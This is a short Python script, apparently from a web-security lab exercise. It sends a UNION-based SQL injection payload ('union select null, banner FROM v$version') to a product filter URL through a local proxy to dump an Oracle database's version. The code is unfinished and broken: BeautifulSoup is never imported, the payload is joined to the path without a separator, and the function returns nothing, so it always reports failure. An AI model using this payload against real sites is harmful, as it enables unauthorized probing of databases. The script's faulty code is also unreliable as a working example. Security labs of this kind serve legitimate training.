import requests 
import sys
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}



def exploit_sqli_version(url):
    path = 'filter?category=Accessories'
    sqli_payload = "' union select null, banner FROM v$version--"
    r = requests.get(url + path + sqli_payload, verify=False, proxies=proxies)
    res = r.text
    soup = BeautifulSoup(r.text, 'html.parser')




if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()

    except:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com')
        sys.exit(-1)

    print('Dumping the version of the database...')

    if not exploit_sqli_version(url):
        print('[-] Unable to dump database version.')